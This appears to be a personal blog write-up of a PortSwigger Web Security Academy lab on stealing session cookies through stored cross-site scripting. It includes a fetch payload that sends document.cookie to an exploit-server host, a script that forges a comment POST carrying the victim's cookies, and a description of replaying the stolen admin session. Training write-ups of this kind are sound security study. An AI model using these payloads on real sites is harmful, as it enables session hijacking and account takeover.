+++
date = '2026-06-30T14:19:16+08:00'
draft = false
title = 'Exploiting cross-site scripting to steal cookies'
tags = ['training', 'PortSwigger', 'writeups', 'web-exploitation']
description = ''
showLastUpdated = true
+++

(dont rlly like this lab because of paywall)
First, to steal cookies we must know the attributes of them. By using the Developer Tool, we can see that our cookie `session` does not have `HttpOnly` flagged. This means client-side JS can read cookies via `document.cookie`, making our job easier.
![](/images/5848ca55-38c1-4ef1-966a-d8581126acf7.jpg)

As usual, we try to insert our canary and see what's up:
![](/images/700db3c5-13bb-413e-8d7f-a8b8ad68704b.jpg)
This is a bit of a logic jump but I tried inserting angled brackets and found out that it wasn't encoded like other labs. I then attempted to insert a simple `alert` payload, lo and behold the parser recognises the payload as HTML. We can *assume* that there are no encoding filter or WAF blocks, meaning we can build our payloads no problemo.

Since I'm using Burp Community, using Collaborator is out of the picture. I tried to use a CSRF lab's exploit server to compensate, and came up with the following payload:
```javascript
fetch("https://<id>.exploit-server.net/exploit?cookie=" + btoa(document.cookie));
```
The log captured my cookie successfully whenever I visited the injected page, but for some reason I could not get the simulated victim to load the page (maybe I do need Collaborator after all). Solving this seems hopeless.

That's when I stumbled upon [this](https://www.youtube.com/watch?v=N_87S9XVy0w). In a nutshell, it's a CSRF approach. Since `HttpOnly` is disabled for CSRF as well (because if it's set True then JS has no way to read and verify tokens), we can take advantage of this and craft the following payload:
```html
<script>
setTimeout(function(){
    var token = document.getElementsByName('csrf')[0].value;
    var data = new FormData();

    data.append('csrf', token);
    data.append('postId', 3);
    data.append('comment', document.cookie);
    data.append('name', 'victim');
    data.append('email', 'hacked@victim.com');
    data.append('website', 'http://test.com');

    fetch('/post/comment', {
        method: 'POST',
        body: data
    });
}, 100);
</script>
```
I used `setTimeout` here to delay *just enough* for the parser to finish parsing the form, then steal the token and forge a POST request. Thankfully, this method works as intended and we can see the damning evidence on the comment section.
![](/images/58b7b394-593a-447f-ab3d-9a9ceaa333bd.jpg)
Surprisingly, there is another `secret` cookie hanging around which raises the possibility of the victim being an admin of the site. By sending the request to `/my-account` to Repeater and pasting the stolen cookies, we can steal the admin's session as shown here:
![](/images/2bb7ae8c-e433-4f91-86c0-9ad172b56f08.jpg)
While this works, it's not as subtle as the original approach (suppose it works) and the victim will know right away that they've been hijacked.